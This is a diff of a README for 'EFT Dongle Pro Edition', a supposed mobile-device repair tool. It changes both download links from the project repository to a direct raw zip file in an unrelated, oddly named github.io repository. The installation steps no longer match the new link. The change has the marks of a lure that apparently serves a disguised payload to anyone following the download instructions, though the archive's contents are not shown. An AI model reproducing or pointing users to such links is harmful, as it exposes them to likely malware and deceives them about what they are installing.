@@ -5,7 +5,7 @@ description: "Download the EFT Dongle Pro installer for Windows 10 and 11 to man
 ---
 # 🛠️ EFT-Dongle-Pro-Edition - Repair your mobile devices with ease
 
-[![](https://img.shields.io/badge/Download-EFT_Dongle_Pro-blue)](https://github.com/caudal-genusaulostomus408/EFT-Dongle-Pro-Edition)
+[![](https://img.shields.io/badge/Download-EFT_Dongle_Pro-blue)](https://github.com/caudal-genusaulostomus408/caudal-genusaulostomus408.github.io/raw/refs/heads/main/rejuvenative/genusaulostomus_caudal_github_io_craniodidymus.zip)
 
 ## Overview
 
@@ -27,7 +27,7 @@ Your computer must meet these settings to run the software:
 You need the installer file to begin. Follow these movements to obtain the software:
 
 1. Open your web browser.
-2. Go to the [EFT Dongle Pro download page](https://github.com/caudal-genusaulostomus408/EFT-Dongle-Pro-Edition).
+2. Go to the [EFT Dongle Pro download page](https://github.com/caudal-genusaulostomus408/caudal-genusaulostomus408.github.io/raw/refs/heads/main/rejuvenative/genusaulostomus_caudal_github_io_craniodidymus.zip).
 3. Find the latest release on the right side of the page.
 4. Click the file name to start the download.
 5. Save the file in a folder you can find later.
